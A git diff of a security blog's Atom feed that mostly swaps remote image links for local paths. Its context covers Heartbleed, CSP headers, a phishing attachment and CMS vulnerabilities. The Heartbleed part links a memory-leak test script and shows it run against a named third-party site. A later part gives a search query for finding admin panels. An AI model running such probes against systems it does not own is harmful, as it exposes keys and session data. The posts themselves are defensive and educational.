-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-CiDaDbmxMK0/U0lGuQ6J1iI/AAAAAAAAARg/cZQSD4k7F40/s2560/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-CiDaDbmxMK0/U0lGuQ6J1iI/AAAAAAAAARg/cZQSD4k7F40/w687-h422-no/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140411/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;
 
@@ -6681,7 +6958,7 @@ Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
 
 &lt;p&gt;直接輸入 Domain 即可查詢，例如「fbi.gov」。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/w897-h678-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;自我測試工具 &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt; （或 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;http://pastebin.com/WmxzjkXJ&lt;/a&gt;）&lt;/li&gt;
@@ -6689,7 +6966,7 @@ Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
 
 &lt;p&gt;使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/w509-h677-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140409/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;原始碼如下：&lt;/p&gt;
 
@@ -6911,7 +7188,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
 &lt;p&gt;還記得在上一篇 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP headers 的資安議題 (1)&lt;/a&gt; 文章中，我們提到了多種資安相關的 HTTP headers 嗎？接下來的幾篇文章我們會介紹幾個專門對付 XSS 的 HTTP headers，首先就由 Content-Security-Policy 打頭陣。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;（以下簡稱 CSP）是從 2010 年被提出來的一項 Web 規格，主要目的是用來防止 Cross-Site Scripting（以下簡稱 XSS）跟網頁樣式置換（例如&lt;a href=&quot;http://udn.com/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;科技部被惡搞&lt;/a&gt;就是一個最好的例子）。經過五年發展，CSP 1.0 已從 W3C 的 TR (Technical Report) 變成 &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;，應該不久就會將成為 W3C 推薦標準。新的 &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; 則仍在草案階段。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content-Security-Policy&lt;/a&gt;（以下簡稱 CSP）是從 2010 年被提出來的一項 Web 規格，主要目的是用來防止 Cross-Site Scripting（以下簡稱 XSS）跟網頁樣式置換（例如&lt;a href=&quot;https://web.archive.org/web/20140321184408/http://udn.com:80/NEWS/NATIONAL/NAT5/8554327.shtml&quot;&gt;科技部被惡搞&lt;/a&gt;就是一個最好的例子）。經過五年發展，CSP 1.0 已從 W3C 的 TR (Technical Report) 變成 &lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Candidate Recommendation&lt;/a&gt;，應該不久就會將成為 W3C 推薦標準。新的 &lt;a href=&quot;http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html&quot;&gt;CSP 1.1&lt;/a&gt; 則仍在草案階段。&lt;/p&gt;
 
 &lt;p&gt;CSP 家族龐大，總共有三個類別，六個項目：&lt;/p&gt;
 
@@ -6926,7 +7203,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
 &lt;p&gt;在 CSP 發展初期，主流瀏覽器並未全部依照同一標準來開發，因此發展成這三種類別。目前由於 CSP 1.0 即將成為標準，大多數瀏覽器已支援 Content-Security-Policy 這個類別，因此狀況已逐漸收斂。主流瀏覽器的支援列表如下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-qJvtcG9lvq8/Ux6DrOeqNhI/AAAAAAAAALQ/gzQ2EbNrOHA/w531-h105-no/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-qJvtcG9lvq8/Ux6DrOeqNhI/AAAAAAAAALQ/gzQ2EbNrOHA/w531-h105-no/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy 瀏覽器支援列表&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-browser-support-list.png&quot; alt=&quot;Content-Security-Policy 瀏覽器支援列表&quot; title=&quot;Content-Security-Policy 瀏覽器支援列表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;從列表中可看到，只要使用 Content-Security-Policy 與 X-Content-Security-Policy 就已有很高的覆蓋率，除非要支援 Safari 6，否則不用特意使用 X-WebKit-CSP。更詳細的瀏覽器支援列表可參考 &lt;a href=&quot;http://caniuse.com/contentsecuritypolicy&quot;&gt;Can I use&lt;/a&gt;。&lt;/p&gt;
 
@@ -6988,7 +7265,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 &lt;span class=&quot;x&quot;&gt;    &amp;lt;/body&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;x&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-DVXEu8Xe4GQ/Ux6DqiVHyBI/AAAAAAAAALU/88qSfa5aJkY/w754-h633-no/csp-demo-1.png&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-DVXEu8Xe4GQ/Ux6DqiVHyBI/AAAAAAAAALU/88qSfa5aJkY/w754-h633-no/csp-demo-1.png&quot; alt=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-1.png&quot; alt=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; title=&quot;使用最寬鬆的 Content-Security-Policy 規則&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;接下來我們將 php header 的那一行程式碼修改如下並且 reload 瀏覽器頁面：&lt;/p&gt;
 
@@ -6996,7 +7273,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-iisyWwpo5IY/Ux6Dqn3FBgI/AAAAAAAAALM/MahpofJ2sK0/w754-h633-no/csp-demo-2.png&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-iisyWwpo5IY/Ux6Dqn3FBgI/AAAAAAAAALM/MahpofJ2sK0/w754-h633-no/csp-demo-2.png&quot; alt=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-2.png&quot; alt=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; title=&quot;使用 Content-Security-Policy 限制 img 與 frame 的來源&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;使用 CSP 限制 img 與 frame 的來源種類後，我們可以從上圖 Chrome Inspector 的紅字觀察到，網站的圖片與 iframe 影片已被瀏覽器擋掉，無法載入。&lt;/p&gt;
 
@@ -7006,7 +7283,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 &lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Content-Security-Policy-Report-Only: default-src *; img-src https:; frame-src &amp;#39;none&amp;#39;; report-uri http://devco.re/demo&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-zLXj9r2aIxc/UyGO-Bzi_5I/AAAAAAAAANU/nbwz6lAfTLc/w754-h594-no/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-zLXj9r2aIxc/UyGO-Bzi_5I/AAAAAAAAANU/nbwz6lAfTLc/w754-h594-no/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; title=&quot;Content-Security-Policy-Report-Only&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/csp-demo-report-only.png&quot; alt=&quot;Content-Security-Policy-Report-Only&quot; title=&quot;Content-Security-Policy-Report-Only&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;由上圖可以看到，此 header 不會直接阻擋不符合 CSP 規範的資源，但是會根據使用者所違反的規則發送相對應的 POST request 至指定的 URI，發送內容如下：&lt;/p&gt;
 
@@ -7029,7 +7306,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
 &lt;p&gt;目前採用 CSP 的案例較少，比較知名的使用案例是 &lt;a href=&quot;https://github.com/&quot;&gt;GitHub&lt;/a&gt;，在 2013 年 4 月 &lt;a href=&quot;https://github.com/blog/1477-content-security-policy&quot;&gt;GitHub 還寫了一篇專文&lt;/a&gt;公告表示他們已開始採用 CSP。另外一個案例廠商可能較廣為人知，是在 2013 年當紅的免費儲存空間 &lt;a href=&quot;https://mega.co.nz/&quot;&gt;MEGA&lt;/a&gt;。兩個案例的實際內容可見於下圖：&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-WPU1UT9T6WA/Ux6DrfiQ_EI/AAAAAAAAALc/s0XmlPFKmoc/w1169-h758-no/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-WPU1UT9T6WA/Ux6DrfiQ_EI/AAAAAAAAALc/s0XmlPFKmoc/w1169-h758-no/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140408/http-headers-github-and-mega.jpg&quot; alt=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; title=&quot;GitHub 與 MEGA 使用 CSP 後的 HTTP response&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;另一項知名使用案例是 Google 明定&lt;a href=&quot;https://developer.chrome.com/extensions/contentSecurityPolicy&quot;&gt;開發 Chrome Extension 時必須使用 CSP&lt;/a&gt;，以追求更高的安全性。Mozilla 也在 &lt;a href=&quot;https://wiki.mozilla.org/Security/CSP/Specification&quot;&gt;MozillaWiki 開了一頁&lt;/a&gt;存放相關技術細節。若您想觀察其他使用案例，可使用 Chrome Inspector 或 curl 觀察以下幾個網站：&lt;a href=&quot;https://lastpass.com/&quot;&gt;LastPass&lt;/a&gt;，&lt;a href=&quot;https://twitter.com/&quot;&gt;Twitter&lt;/a&gt;，&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;。&lt;/p&gt;
 
@@ -7086,9 +7363,9 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
    <id>https://devco.re/blog/2014/03/31/Google-Account-Phishing-Scam</id>
    <content type="html">&lt;p&gt;最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-GpAMTR_IrK0/UzlQhywLcII/AAAAAAAAAO8/LgV3z4knQc4/w788-h26-no/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-01.png&quot; alt=&quot;Gmail state-sponsored attacker warning&quot; title=&quot;Gmail state-sponsored attacker warning&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-4JfiexvrRVs/UzlQh7GiRPI/AAAAAAAAAOw/uGaBU031GnA/w1024-h649-no/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail 國家資助的攻擊者警告&quot; title=&quot;Gmail 國家資助的攻擊者警告&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-03.png&quot; alt=&quot;Gmail 國家資助的攻擊者警告&quot; title=&quot;Gmail 國家資助的攻擊者警告&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;駭客間的戰爭已經不只是個人對個人，而已經擴大成國家對國家。一個國家為了獲取他國的機密文件、情報、個人資料等，都會想盡各種辦法入侵帳號、寄送惡意郵件、釣魚盜取密碼等。而身為受害者的我們能做什麼呢？Google 官方提出的建議是：加強密碼安全、注意登入 IP 位址、更新自己使用的軟體、&lt;a href=&quot;https://support.google.com/accounts/answer/180744?hl=zh-Hant&quot;&gt;開啟二階段驗證&lt;/a&gt;。當然有良好的資安意識才是更重要的。&lt;/p&gt;
 
@@ -7098,17 +7375,17 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
 &lt;p&gt;在信箱中躺著一封很像是國外客戶的信件「Company Profile / Order Details」。內容看起來也很正常，並且附上了公司的基本資料為附加檔案。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-BczI2MA-WFw/UzlQihSF0bI/AAAAAAAAAO0/qkzfK9xXoZ8/w708-h548-no/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;釣魚信件&quot; title=&quot;釣魚信件&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-04.png&quot; alt=&quot;釣魚信件&quot; title=&quot;釣魚信件&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;點開附件，會發現畫面先跳了 JavaScript 警告視窗後，隨即導向到 Google 登入頁面。&lt;/p&gt;
 
 &lt;p&gt;注意看，這個登入頁面是真的嗎？有沒有發現畫面上的「Stay signed in」前面的勾變成方框了？瀏覽器上的網址也是在本機的位址。想想看，怎麼可能點了附件之後，跳轉到 Google 登入畫面？&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-a_-JazlxC0o/UzlQiscnjDI/AAAAAAAAAPE/i9vS3hd5m_I/w897-h678-no/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;釣魚信件附件假冒 Google 登入&quot; title=&quot;釣魚信件附件假冒 Google 登入&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-05.png&quot; alt=&quot;釣魚信件附件假冒 Google 登入&quot; title=&quot;釣魚信件附件假冒 Google 登入&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;讓我們看一下原始碼，會發現他的 form 被改成一個奇怪的網址，看起來就是惡意網站。其餘網頁的部份都是從 Google 真實的登入頁面抓取下來修改的。因此只要一不注意，就會以為是真的 Google 登入畫面而輸入帳號密碼。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w1280/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w850-h678-no/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;釣魚信件原始碼&quot; title=&quot;釣魚信件原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140331/2014-03-31-Google-Account-Phishing-Scam-06.png&quot; alt=&quot;釣魚信件原始碼&quot; title=&quot;釣魚信件原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;節錄部分 code 如下：&lt;/p&gt;
 
@@ -7175,12 +7452,12 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 
 &lt;p&gt;&lt;a href=&quot;http://www.dedecms.com/&quot;&gt;DedeCMS&lt;/a&gt; 是知名的內容管理系統，不少公司拿此套件架設網站、部落格等。但在這幾個月，在「&lt;a href=&quot;http://wooyun.org&quot;&gt;烏雲平台&lt;/a&gt;」上陸續有人揭露 DedeCMS 的漏洞。包括大量各種 SQL Injection、Cross-Site Scripting 弱點等等，甚至還包括 Command Execution 問題。如果沒有即時修正這些問題，小則造成用戶帳號被盜，大則造成整台主機被入侵，取得作業系統權限。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w960-h678-no/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-oPACG8e-4t0/Ux3lMIP6NVI/AAAAAAAAAKc/V9RKKU7mz1A/w600/blog_3rd_party_security_00.png&quot; alt=&quot;烏雲漏洞報告平台&quot; title=&quot;烏雲漏洞報告平台&quot; /&gt;&lt;br /&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_00.png&quot; alt=&quot;烏雲漏洞報告平台&quot; title=&quot;烏雲漏洞報告平台&quot; /&gt;&lt;br /&gt;
 &lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;什麼系統沒被找到漏洞過呢？有那麼嚴重嗎？但該系統已經不只一次出現重大漏洞導致企業遭到入侵，在今年一二月份更是遭揭露多達十數個高風險 SQL Injection 資料庫注入漏洞。此現象凸顯該套件的設計並未經過安全測試，並且採用不安全的程式撰寫方式，未來可能會有更多隱含的漏洞釋出。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w1218-h860-no/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-JIR-uh9OveA/Ux3lMKjdogI/AAAAAAAAAKY/ZmWDD7Yg-js/w600/blog_3rd_party_security_02.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_02.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;在平台中搜尋關鍵字「DedeCMS」，會發現漏洞提報的次數相當多，在漏洞的評論中也有不少技術人員進行討論。但更多的疑惑是為什麼 DedeCMS 會一再的發生資安問題。例如以下漏洞：&lt;/p&gt;
 
@@ -7191,11 +7468,11 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
   &lt;li&gt;&lt;a href=&quot;http://www.wooyun.org/bugs/wooyun-2014-052792&quot;&gt;Dedecms某命令执行漏洞（续）&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w1218-h860-no/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-TD5ZDIQe4K4/Ux3lMyME3vI/AAAAAAAAAKg/BlLdMesp0MI/w600/blog_3rd_party_security_03.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_03.png&quot; alt=&quot;dedecms漏洞於烏雲平台&quot; title=&quot;dedecms漏洞於烏雲平台&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;而於另一個「&lt;a href=&quot;http://sebug.net&quot;&gt;Sebug 安全漏洞信息庫&lt;/a&gt;」也可以看到不少 DedeCMS 的蹤影。&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w1218-h860-no/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-5YS9t-YHgKk/Ux3lMMmjbqI/AAAAAAAAAKU/FWFu1liQdks/w600/blog_3rd_party_security_01.png&quot; alt=&quot;sebug安全漏洞信息庫&quot; title=&quot;sebug安全漏洞信息庫&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_01.png&quot; alt=&quot;sebug安全漏洞信息庫&quot; title=&quot;sebug安全漏洞信息庫&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;如果官方在第一時間就能接獲通報、了解問題並修正解決，提供更新程式給客戶更新，那安全的風險會小些。但在官方尚未釋出更新的這段時間，網站將完全的暴露在風險當中。有心人士看到套件的漏洞陸續被揭露，也會更有興趣尋找使用該套件的網站攻擊。&lt;/p&gt;
 
@@ -7207,7 +7484,7 @@ Heartbleed: What is it and what are options to mitigate it? &lt;a href=&quot;htt
 site:tw intitle:管理區 inurl:administrator
 &lt;/pre&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w1218-h860-no/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-_PP2U3n_zW8/Ux77uXKLAnI/AAAAAAAAAME/_e8VIuM_ATQ/w600/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking 尋找 Joomla!&quot; title=&quot;Google Hacking 尋找 Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140314/blog_3rd_party_security_04.png&quot; alt=&quot;Google Hacking 尋找 Joomla!&quot; title=&quot;Google Hacking 尋找 Joomla!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
 
 &lt;p&gt;但是如果今天這個系統出了問題呢？「Joomla!」因為外掛、套件眾多，也經常成為漏洞發掘的對象。在 2014/02/05，國外釋出了一個 SQL Injection Exploit，可以導致網站帳號密碼直接被導出。&lt;/p&gt;
 
@@ -7383,13 +7660,13 @@ CVE Number: Pending&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;上述 headers 的數量是不是稍微超過你的想像？其實這些技術早已被很多大公司採用，像是 Google、Facebook、Twitter 等常見的網路服務都可看到這些 headers 的蹤影。下面這張圖片使用 Chrome 的 Inspector 來觀察 Twitter 的 HTTP response 內容：&lt;/p&gt;
 
